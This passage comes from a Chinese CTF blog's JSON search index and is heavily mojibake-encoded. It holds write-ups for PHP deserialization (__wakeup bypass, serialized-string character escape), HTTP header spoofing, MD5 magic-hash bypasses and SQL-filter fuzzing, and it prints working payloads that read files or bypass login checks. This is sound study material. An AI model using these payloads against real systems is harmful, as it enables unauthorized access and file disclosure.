ï¼ˆflagè¯´å¾—å¯¹x","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/tags/wp/"}]},{"title":"æå®¢å¤§æŒ‘æˆ˜ 2019 Http","slug":"æå®¢å¤§æŒ‘æˆ˜-2019-Http","date":"2021-02-08T12:06:49.000Z","updated":"2021-09-22T10:01:38.075Z","comments":true,"path":"2021/02/08/æå®¢å¤§æŒ‘æˆ˜-2019-Http/","link":"","permalink":"https://123-prog.github.io/2021/02/08/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/","excerpt":"0x01 æºç å‘ç°Secret.php","text":"0x01 æºç å‘ç°Secret.php 0x02 è®¿é—® åœ¨httpè¯·æ±‚å¤´ä¸­æ„é€ Referer: https://www.Sycsecret.com å†æ¬¡è¯·æ±‚å¾—åˆ° å®ƒè®©æˆ‘ä»¬ç”¨Sycloveræµè§ˆï¼Œä¿®æ”¹User-Agentå¤´å³å¯ æ„é€ User-Agent: Syclover è¯·æ±‚ æ„é€ X-Forwarded-For: 127.0.0.1","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"other","slug":"CTF/other","permalink":"https://123-prog.github.io/categories/CTF/other/"}],"tags":[{"name":"httpè¯·æ±‚å¤´","slug":"httpè¯·æ±‚å¤´","permalink":"https://123-prog.github.io/tags/http%E8%AF%B7%E6%B1%82%E5%A4%B4/"}]},{"title":"æå®¢å¤§æŒ‘æˆ˜ 2019 PHP","slug":"æå®¢å¤§æŒ‘æˆ˜-2019-PHP","date":"2021-02-03T10:27:09.000Z","updated":"2021-09-22T10:01:08.666Z","comments":true,"path":"2021/02/03/æå®¢å¤§æŒ‘æˆ˜-2019-PHP/","link":"","permalink":"https://123-prog.github.io/2021/02/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/","excerpt":"0x01 æºç æ³„éœ²æ ¹æ®æç¤ºï¼Œç½‘ç«™å­˜åœ¨å¤‡ä»½ï¼Œä¸ç”¨æ‰«æï¼Œè¿™é‡Œå¤‡ä»½æ–‡ä»¶ä¸ºå¸¸è§çš„www.zipï¼Œå¾—åˆ°æºç ","text":"0x01 æºç æ³„éœ²æ ¹æ®æç¤ºï¼Œç½‘ç«™å­˜åœ¨å¤‡ä»½ï¼Œä¸ç”¨æ‰«æï¼Œè¿™é‡Œå¤‡ä»½æ–‡ä»¶ä¸ºå¸¸è§çš„www.zipï¼Œå¾—åˆ°æºç  class.php: 123456789101112131415161718192021222324252627282930313233343536&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; index.php: 12345&lt;?php include &#x27;class.php&#x27;; $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select);?&gt; 0x02 æ„é€ payloadååºåˆ—åŒ–æ¼æ´ï¼Œè¿™é‡Œéœ€è¦ç»•è¿‡__wakeup()æ–¹æ³•ï¼Œè®©username=admin,passwd=100 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;$a = new Name(&#x27;admin&#x27;,&#x27;100&#x27;);echo serialize($a); å¾—åˆ°ç»“æœ 1O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125; æ³¨æ„åœ¨ç±»ä¸­usernameå’Œpasswordå˜é‡æ˜¯privateä¿®é¥°çš„ï¼Œæ‰€ä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œåœ¨å˜é‡å‰å’Œç±»åå‰å…¶å®å­˜åœ¨ä¸€ä¸ª\\0ï¼ˆè¡¨ç¤ºASCIIç ä¸º0ï¼‰ä¸å¯è§å­—ç¬¦,è¿™ä¸ªå­—ç¬¦ä¸å¯è§ï¼Œä½†ç®—è¿›é•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æäº¤çš„æ—¶å€™å°±éœ€è¦åœ¨å‰é¢æ·»åŠ è¿™ä¸ªå­—ç¬¦ï¼Œç”¨pythonæäº¤å†™æˆ\\0,å¦‚ï¼š 1?select&#x3D;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;&#125; åœ¨è¿™é“é¢˜ä¸­ç”¨getæäº¤å°†\\0æ¢æˆ%00å³å¯ 1?select&#x3D;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; æœ€åï¼Œç»•è¿‡__wakeup()æ–¹æ³•ï¼Œåªéœ€è¦è®©åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºçš„å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºå®é™…å±æ€§ä¸ªæ•°å°±å¯ä»¥ç»•è¿‡ æœ€åçš„payload 1?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; å°†å±æ€§ä¸ªæ•°2æ”¹æˆ3å°±å¯ä»¥äº†","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"å®‰æ´µæ¯ 2019 easy_serialize_php","slug":"å®‰æ´µæ¯-2019-easy-serialize-php","date":"2021-01-24T03:31:42.000Z","updated":"2021-09-22T10:00:38.812Z","comments":true,"path":"2021/01/24/å®‰æ´µæ¯-2019-easy-serialize-php/","link":"","permalink":"https://123-prog.github.io/2021/01/24/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/","excerpt":"0x01 å…³äºååºåˆ—åŒ–æ¼æ´ä¸­çš„å­—ç¬¦é€ƒé€¸æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ç»è¿‡å­—ç¬¦ä¸²æ›¿æ¢å¯¼è‡´åºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜é•¿ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ç»è¿‡å­—ç¬¦ä¸²æ›¿ä»£ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­ï¼Œä¸¤ç§éƒ½æ˜¯å› ä¸ºåœ¨åºåˆ—åŒ–åï¼Œå¯¹åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯¹å…¶ä¸­çš„æ•æ„Ÿå­—ç¬¦è¿›è¡Œæ›¿ä»£ï¼ŒåŸæœ¬æ˜¯å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œç°åœ¨åå€’å‡ºç°äº†å¯ä»¥åˆ©ç”¨çš„æœºä¼š","text":"0x01 å…³äºååºåˆ—åŒ–æ¼æ´ä¸­çš„å­—ç¬¦é€ƒé€¸æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯ç»è¿‡å­—ç¬¦ä¸²æ›¿æ¢å¯¼è‡´åºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜é•¿ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ç»è¿‡å­—ç¬¦ä¸²æ›¿ä»£ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­ï¼Œä¸¤ç§éƒ½æ˜¯å› ä¸ºåœ¨åºåˆ—åŒ–åï¼Œå¯¹åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯¹å…¶ä¸­çš„æ•æ„Ÿå­—ç¬¦è¿›è¡Œæ›¿ä»£ï¼ŒåŸæœ¬æ˜¯å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œç°åœ¨åå€’å‡ºç°äº†å¯ä»¥åˆ©ç”¨çš„æœºä¼š 1.å­—ç¬¦ä¸²è†¨èƒ€å¯¼è‡´çš„å­—ç¬¦é€ƒé€¸æµ‹è¯•ç¨‹åºï¼š 123456789101112131415161718&lt;?phpfunction filter($str)&#123; return preg_replace(&#x27;/x/&#x27;, &#x27;xx&#x27;, $str);&#125;$username = $_GET[&#x27;name&#x27;];$password = &#x27;123456&#x27;;$user_info = array(&#x27;name&#x27;=&gt; $username, &#x27;pwd&#x27;=&gt;$password);$serialize_info = serialize($user_info);$serialize_info = filter($serialize_info);echo $serialize_info;echo &#x27;&lt;br&gt;&#x27;;$user = unserialize($serialize_info);echo $user[&#x27;name&#x27;];echo &#x27;&lt;br&gt;&#x27;;echo $user[&#x27;pwd&#x27;];?&gt; æˆ‘åœ¨æœ¬åœ°çš„æµ‹è¯•ç¯å¢ƒæ˜¯php5.4.45ï¼Œé¢˜ç›®æ˜¯php7.0.33ï¼Œå¥½åƒæœ‰äº›ä½ç‰ˆæœ¬ä¼šå¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„åŒå¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œå¯¼è‡´æµ‹è¯•å¤±è´¥ï¼Œä½†æˆ‘åœ¨php5.4.45ç»è¿‡æµ‹è¯•ï¼Œå¯ä»¥åˆ©ç”¨ 123456789101112131.æ­£å¸¸æƒ…å†µä¸‹ï¼šhttp:&#x2F;&#x2F;localhost&#x2F;test&#x2F;3.php?name&#x3D;mySh1ftè¾“å‡ºï¼ša:2:&#123;s:4:&quot;name&quot;;s:7:&quot;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;mySh1ft1234562.å½“æˆ‘è¾“å…¥çš„å‚æ•°nameä¸­å¸¦æœ‰x,è¿‡æ»¤åå°±ä¼šå‡ºç°é—®é¢˜ï¼Œä¸‹é¢æ˜¯åˆ©ç”¨æ–¹å¼http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;3.php?name&#x3D;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;pwd&quot;;s:6:&quot;654321&quot;;&#125;è¾“å‡ºï¼ša:2ï¼š&#123;s:4:&quot;name&quot;;s:52:&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:3:&quot;pwd&quot;;s:6:&quot;654321&quot;;&#125;&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;&#125;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx654321 a:2ï¼š{s:4:â€nameâ€;s:52:â€xxxxxxxxxxxxxxxxxxxxxxxxxxâ€;s:3:â€pwdâ€;s:6:â€654321â€;}â€œ;s:3:â€pwdâ€;s:6:â€123456â€;} a:2ï¼š{s:4:â€nameâ€;s:52:â€xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxâ€œ;s:3:â€pwdâ€;s:6:â€654321â€;}â€;s:3:â€pwdâ€;s:6:â€123456â€;} åŸæœ¬52ä¸ªå­—ç¬¦åº”è¯¥åŒ…æ‹¬ä¸Šé¢åŠ ç²—éƒ¨åˆ†ï¼Œä½†ç°åœ¨xè¢«æ›¿æ¢æˆxx,åŸæœ¬26ä¸ªxåˆšå¥½å‡‘æˆ52ä¸ªå­—ç¬¦ï¼Œå¯¼è‡´åé¢çš„éƒ¨åˆ†é€ƒé€¸ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡nameå˜é‡æ§åˆ¶pwdå˜é‡ï¼Œå°†pwdä»123456æ”¹æˆ654321ï¼Œunserialize()å‡½æ•°åœ¨é‡åˆ°;}æ—¶å°±ä¼šåœæ­¢ååºåˆ—åŒ–ï¼Œåé¢çš„ä¸ä¼šç”Ÿæ•ˆã€‚ 2.å­—ç¬¦ä¸²ç¼©çŸ­å¯¼è‡´çš„å­—ç¬¦é€ƒé€¸æµ‹è¯•ç¨‹åºï¼š 123456789101112131415161718192021&lt;?php function filter($str)&#123; return preg_replace(&#x27;/flag/&#x27;, &#x27;&#x27;, $str);&#125;$username = $_GET[&#x27;name&#x27;];$password = $_GET[&#x27;pwd&#x27;];$money = &#x27;111111&#x27;;$user_info = array(&#x27;name&#x27;=&gt; $username, &#x27;pwd&#x27;=&gt;$password,&#x27;money&#x27;=&gt;$money);$serialize_info = serialize($user_info);$serialize_info = filter($serialize_info);echo $serialize_info;echo &#x27;&lt;br&gt;&#x27;;$user = unserialize($serialize_info);echo $user[&#x27;name&#x27;];echo &#x27;&lt;br&gt;&#x27;;echo $user[&#x27;pwd&#x27;];echo &#x27;&lt;br&gt;&#x27;;echo $user[&#x27;money&#x27;];?&gt; 1234567891011121314151.æ­£å¸¸æƒ…å†µï¼šhttp:&#x2F;&#x2F;localhost&#x2F;test&#x2F;4.php?name&#x3D;mySh1ft&amp;pwd&#x3D;123456è¾“å‡ºï¼ša:3:&#123;s:4:&quot;name&quot;;s:7:&quot;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;money&quot;;s:6:&quot;111111&quot;;&#125;mySh1ft1234561111112.å­—ç¬¦ä¸²å­˜åœ¨æ•æ„Ÿå­—ç¬¦ï¼šhttp:&#x2F;&#x2F;localhost&#x2F;test&#x2F;4.php?name&#x3D;mySh1ftflagflagflagflagflag&amp;pwd&#x3D;12&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;money&quot;;s:10:&quot;1111111111&quot;;&#125;3456è¾“å‡ºï¼ša:3:&#123;s:4:&quot;name&quot;;s:27:&quot;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:62:&quot;12&quot;;s:3:&quot;pwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;money&quot;;s:10:&quot;1111111111&quot;;&#125;3456&quot;;s:5:&quot;money&quot;;s:6:&quot;111111&quot;;&#125;mySh1ft&quot;;s:3:&quot;pwd&quot;;s:62:&quot;121234561111111111 åŸæœ¬åº”è¯¥æ˜¯è¿™æ ·ï¼š a:3:{s:4:â€nameâ€;s:27:â€mySh1ftflagflagflagflagflagâ€œ;s:3:â€pwdâ€;s:62:â€12â€;s:3:â€pwdâ€;s:6:â€123456â€;s:5:â€moneyâ€;s:10:â€1111111111â€;}3456â€œ;s:5:â€moneyâ€;s:6:â€111111â€œ;} ä½†å­—ç¬¦ä¸²flagä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œç»“æœå˜æˆè¿™æ ·ï¼š a:3:{s:4:â€nameâ€;s:27:â€mySh1ftâ€;s:3:â€pwdâ€;s:62:â€12â€œ;s:3:â€pwdâ€;s:6:â€123456â€œ;s:5:â€moneyâ€;s:10:â€1111111111â€œ;}3456â€;s:5:â€moneyâ€;s:6:â€111111â€;} åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œnameæœ‰27ä¸ªå­—ç¬¦ï¼Œä½†ç¬¬ä¸€ä¸ªåŒå¼•å·åŒ…æ‹¬çš„åªæœ‰7ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å‘åâ€œåå™¬â€ï¼Œæˆ‘ä»¬è®¡ç®—ååœ¨åˆé€‚çš„ä½ç½®æ’å…¥åé¢çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è¾¾åˆ°æ”¹å˜åé¢å˜é‡çš„ç›®çš„ 0x02 è§£é¢˜1.æºç ï¼š12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; åˆ†æï¼Œè¿™é‡Œæ˜¯è¿‡æ»¤åºåˆ—åŒ–å­—ç¬¦ä¸²å¹¶å°†æ•æ„Ÿè¯æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥æ˜¯å­—ç¬¦ä¸²çš„ç¼©çŸ­å¯¼è‡´çš„é€ƒé€¸ï¼Œextract()å‡½æ•°å¯ä»¥å°†æ•°ç»„ä¸­çš„å€¼å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œå¯ä»¥å¾ˆå®¹æ˜“å¤„ç†postæˆ–getå¾—åˆ°çš„æ•°æ®è€Œä¸ç”¨ä¸€ä¸ªä¸€ä¸ªè¿›è¡Œèµ‹å€¼ï¼Œè¿™ä¹Ÿå°±ä»£è¡¨æˆ‘ä»¬å¯ä»¥é€šè¿‡postå˜é‡è¦†ç›–$_SESSIONæ•°ç»„å˜é‡ï¼Œä»è€Œæ§åˆ¶å˜é‡ 2.æŸ¥çœ‹phpinfo å¯ä»¥çœ‹åˆ°è¿™é‡Œè‡ªåŠ¨åŒ…å«äº†ä¸€ä¸ªåä¸ºd0g3_f1ag.phpçš„æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥æ„é€ payloadæ¥æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶å†…å®¹ 3.æ„é€ payloadä¸ºäº†æ–¹ä¾¿æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘åœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯• 123456789101112131415161718192021&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);$serialize_info = filter(serialize($_SESSION));echo $serialize_info.&#x27;&lt;br&gt;&#x27;;$userinfo = unserialize($serialize_info);echo $userinfo[&#x27;function&#x27;].&#x27;&lt;br&gt;&#x27;;echo base64_decode($userinfo[&#x27;img&#x27;]); postæ•°æ®ï¼š 1_SESSION[user]&#x3D;guestflagflagflagflagflagphp&amp;_SESSION[function]&#x3D;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:12:&quot;bXlTaDFmdA&#x3D;&#x3D;&quot;;&#125;show_image&amp;_SESSION[img]&#x3D;1 æ•°ç»„å†…çš„keyæ³¨æ„ä¸ç”¨åŠ å¼•å·å¾—åˆ°çš„è¾“å‡ºï¼š a:3:{s:4:â€userâ€;s:28:â€guestâ€;s:8:â€functionâ€;s:76:â€â€œ;s:8:â€functionâ€;s:10:â€show_imageâ€;s:3:â€imgâ€;s:12:â€bXlTaDFmdA==â€;}show_imageâ€;s:3:â€imgâ€;s:1:â€1â€;}show_imagemySh1ft ç°åœ¨å·²ç»å¯ä»¥æ§åˆ¶imgå˜é‡äº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨æºç ä¸­çš„file_get_contents()å‡½æ•°æŸ¥çœ‹æˆ‘ä»¬éœ€è¦æ–‡ä»¶çš„ä¿¡æ¯ postæ•°æ®ï¼Œæ³¨æ„è¦æ»¡è¶³$functionä¸ºshow_image,æ‰€ä»¥åº”è¯¥åœ¨$_GET[â€˜fâ€™]=show_imageæƒ…å†µä¸‹postæˆ‘ä»¬çš„å˜é‡ 1_SESSION[user]&#x3D;guestflagflagflagflagflagphp&amp;_SESSION[function]&#x3D;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;show_image&amp;_SESSION[img]&#x3D;1 â€œZDBnM19mMWFnLnBocA==â€æ˜¯base64ç¼–ç åçš„d0g3_f1ag.php å³é”®æŸ¥çœ‹æºç  æ›´æ”¹imgå˜é‡ï¼ŒæŸ¥çœ‹flag 1_SESSION[user]&#x3D;guestflagflagflagflagflagphp&amp;_SESSION[function]&#x3D;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;show_image&amp;_SESSION[img]&#x3D;1","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}]},{"title":"BJDCTF2020 Easy MD5","slug":"BJDCTF2020-Easy-MD5","date":"2021-01-20T05:31:53.000Z","updated":"2021-09-22T10:00:11.076Z","comments":true,"path":"2021/01/20/BJDCTF2020-Easy-MD5/","link":"","permalink":"https://123-prog.github.io/2021/01/20/BJDCTF2020-Easy-MD5/","excerpt":"1.è¿›å»å°±ä¸€ä¸ªæäº¤æ¡†","text":"1.è¿›å»å°±ä¸€ä¸ªæäº¤æ¡† è¯•äº†å¥½ä¹…ï¼Œä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæç¤ºï¼Œè¿™é‡Œçœ‹åˆ°æäº¤çš„å‚æ•°æ˜¯password,çŒœæƒ³æœ‰æŸ¥è¯¢æ•°æ®åº“æ“ä½œï¼Œè€Œä¸”æŸ¥è¯¢å‰åº”è¯¥æ˜¯è¿›è¡Œäº†MD5åŠ å¯†ï¼ˆå› ä¸ºé¢˜ç›®è¯´çš„MD5 è¯•è¯•æäº¤password=ffifdyop,å› ä¸ºffifdyopç»è¿‡MD5åŠ å¯†åå½¢æˆ&#39;or 6xxx(ä¹±ç )ï¼Œå¯ä»¥ç»•è¿‡ä¸€äº›æŸ¥è¯¢ï¼Œç„¶åå¥½åƒæˆåŠŸäº†ï¼Œè·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢äº† ï¼ˆåé¢æŸ¥çœ‹æºç ï¼Œå‘ç°è¿™é‡Œå°±æ˜¯ä¸ªifåˆ¤æ–­ã€‚ã€‚ã€‚ã€‚ï¼‰ 12345678910&lt;?phperror_reporting(0);$password = $_GET[&#x27;password&#x27;];if($password == &#x27;ffifdyop&#x27;)&#123; echo &quot;&lt;script&gt;window.location.replace(&#x27;./levels91.php&#x27;)&lt;/script&gt;&quot;;&#125;?&gt; 2.ç¬¬äºŒå…³ï¼Œå³é”®æºä»£ç çœ‹è§é€šå…³æ¡ä»¶ ç™¾åº¦ä¸€ä¸‹MD5ç»•è¿‡ï¼Œå‘ç°å¯ä»¥é€šè¿‡è®©MD5åŠ å¯†åçš„å­—ç¬¦ä¸²ç±»ä¼¼äº0exxxï¼Œå› ä¸º0eä»£è¡¨0çš„å‡ æ¬¡æ–¹éƒ½æ˜¯0ï¼Œå°±å¯ä»¥ç»•è¿‡äº†ï¼Œè¿™é‡Œåˆ—å‡ºä¸€äº›åŠ å¯†åå¯ä»¥å˜æˆ0exxxçš„å­—ç¬¦ä¸² 1234567891011121314151617181920QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 æäº¤?a=QNKCDZO&amp;b=s878926199a,æˆåŠŸè¿›å…¥ä¸‹ä¸€å…³ 3.è¿›å»å°±æ˜¯æºç ç”±äºæ˜¯ç”¨===æ¥åˆ¤æ–­ï¼Œæ‰€ä»¥ç”¨ä¸äº†ä¸Šé¢çš„æ–¹æ³•æ¥ç»•è¿‡ï¼Œç™¾åº¦å‘ç°å¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡ æ‹¿åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"md5ç»•è¿‡","slug":"md5ç»•è¿‡","permalink":"https://123-prog.github.io/tags/md5%E7%BB%95%E8%BF%87/"}]},{"title":"CISCN2019 ååŒ—èµ›åŒº Day2 Web1 Hack World","slug":"CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World","date":"2021-01-16T15:36:45.000Z","updated":"2021-09-22T09:59:43.277Z","comments":true,"path":"2021/01/16/CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World/","link":"","permalink":"https://123-prog.github.io/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/","excerpt":"1.åˆ¤æ–­æ³¨å…¥ç±»å‹postæ³¨å…¥ï¼Œid=1æˆ–id=2æ—¶å›æ˜¾æ­£å¸¸ï¼Œid=1â€™å›æ˜¾bool(false), id=1/1å›æ˜¾æ­£å¸¸ï¼Œåˆ™æ˜¯æ•°å€¼å‹æ³¨å…¥","text":"1.åˆ¤æ–­æ³¨å…¥ç±»å‹postæ³¨å…¥ï¼Œid=1æˆ–id=2æ—¶å›æ˜¾æ­£å¸¸ï¼Œid=1â€™å›æ˜¾bool(false), id=1/1å›æ˜¾æ­£å¸¸ï¼Œåˆ™æ˜¯æ•°å€¼å‹æ³¨å…¥ 2.fuzzä¸€ä¸‹çœ‹çœ‹è¿‡æ»¤12345678910111213141516import requestsurl = &quot;http://4bfe4b6f-e955-4745-98ab-4d80d69579e5.node3.buuoj.cn/index.php&quot;f = open(&quot;./sql.txt&quot;)list = []for line in f: data = &#123; &quot;id&quot;:&quot;1&quot;+line &#125; r = requests.post(url, data=data) if &quot;SQL Injection Checked.&quot; in r.text: print(line) list.append(line)print(list)f.close() 1[&#39;AND&#39;, &#39;AUTHORIZATION&#39;, &#39;CORR&#39;, &#39;CORRESPONDING&#39;, &#39;CURRENT_DEFAULT_TRANSFORM_GROUP&#39;, 